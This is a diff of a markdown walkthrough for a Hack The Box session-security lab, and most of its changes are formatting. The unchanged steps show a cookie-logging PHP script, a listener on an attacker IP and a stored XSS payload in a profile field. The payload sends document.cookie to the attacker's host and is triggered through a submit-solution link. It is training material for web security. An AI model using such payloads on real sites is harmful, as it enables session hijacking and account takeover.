@@ -58,14 +58,14 @@ We will also discuss remediation guidance regarding the abovementioned vulnerabi
 <div style="text-align: justify">1. We utilize virtual hosts (vhosts) to house the web applications to simulate a large, realistic environment with multiple webservers. Since these vhosts all map to a different directory on the same host, we have to make manual entries in our /etc/hosts file on the Pwnbox or local attack VM to interact with the lab.</div><br>
 ![image-center](\assets\images\HTB_Session_Security\Q11\1.png)
 
-<div style="text-align: justify">2. Access to http://minilab.htb.net. First you have to log in with the credentials provided in the statement. Enter the credentials and click on login.</div><br>
+<div style="text-align: justify">2. Access to http://minilab.htb.net. First you have to log in with the credentials provided in the statement. Enter the credentials and click on login.</div>
 ```
 Email: heavycat106
 Password: rocknrol
 ```
 ![image-center](\assets\images\HTB_Session_Security\Q11\2.png)
 
-<div style="text-align: justify">3. Create a PHP script that saves the cookie.</div><br>
+<div style="text-align: justify">3. Create a PHP script that saves the cookie.</div>
 ```sh
 nano log.php
 ```
@@ -85,14 +85,14 @@ exit;
 
 ![image-center](\assets\images\HTB_Session_Security\Q11\3.png)
 
-<div style="text-align: justify">4. Open a listener in the same folder where the PHP script created in the previous step is.</div><br>
+<div style="text-align: justify">4. Open a listener in the same folder where the PHP script created in the previous step is.</div>
 ```sh
 php -S 10.10.15.60:8000
 ```
 ![image-center](\assets\images\HTB_Session_Security\Q11\4.png)
 
 
-<div style="text-align: justify">5. Access the "app" section, enter the following payload in the country field and click on the "Save" button.</div><br>
+<div style="text-align: justify">5. Access the "app" section, enter the following payload in the country field and click on the "Save" button.</div>
 ```php
 <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://10.10.15.60:8000/log.php?c=' + document.cookie;"></video>
 ```
@@ -104,8 +104,10 @@ php -S 10.10.15.60:8000
 <div style="text-align: justify">7. Access http://minilab.htb.net/submit-solution and see how the success field is "false".</div><br>
 ![image-center](\assets\images\HTB_Session_Security\Q11\7.png)
 
-<div style="text-align: justify">8. Insert the following link that contains the profile with the payload as a parameter.</div><br>
+<div style="text-align: justify">8. Insert the following link that contains the profile with the payload as a parameter.</div>
+```
 http://minilab.htb.net/submit-solution?url=http://minilab.htb.net/profile?email=julie.rogers@example.com
+```
 ![image-center](\assets\images\HTB_Session_Security\Q11\8.png)
 
 <div style="text-align: justify">9. We check the listener and see what looks like a cookie thanks to the payload, the script and the listener.</div><br>
